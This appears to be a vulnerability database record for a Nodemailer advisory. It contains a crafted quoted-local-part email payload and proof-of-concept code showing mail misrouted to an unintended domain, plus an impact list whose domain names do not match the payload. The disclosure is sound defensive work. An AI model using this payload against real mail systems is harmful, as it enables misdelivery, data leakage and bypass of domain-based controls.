vulnerability_id: VCID-t7p2-8ebt-p7da
aliases:
  - GHSA-mm7p-fcc7-pg87
summary: "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict\n\
  The email parsing library incorrectly handles quoted local-parts containing @. This leads\
  \ to misrouting of email recipients, where the parser extracts and routes to an unintended\
  \ domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\n\
  Using the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\n\
  let transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user:\
  \ \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>',\
  \ \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\"\
  ,\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions,\
  \ (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n \
  \ console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser\
  \ = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions\
  \ } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true)\
  \ */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n\
  \    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n\
  \    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the\
  \ script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address:\
  \ '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain:\
  \ 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"\
  2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\"\
  \ />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead\
  \ of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding\
  \ recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322\
  \ parsing rules.\n\n-    Domain based access control bypass in downstream applications using\
  \ your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat\
  \ quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts\
  \ containing embedded @ unless fully compliant with quoting."
severities:
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-mm7p-fcc7-pg87
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/nodemailer/nodemailer
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87
weaknesses:
  - CWE-1035
  - CWE-937
  - CWE-20
  - CWE-436
references:
  - url: https://github.com/nodemailer/nodemailer
    reference_type:
    reference_id:
  - url: https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626
    reference_type:
    reference_id:
  - url: https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-mm7p-fcc7-pg87
    reference_type:
    reference_id: GHSA-mm7p-fcc7-pg87
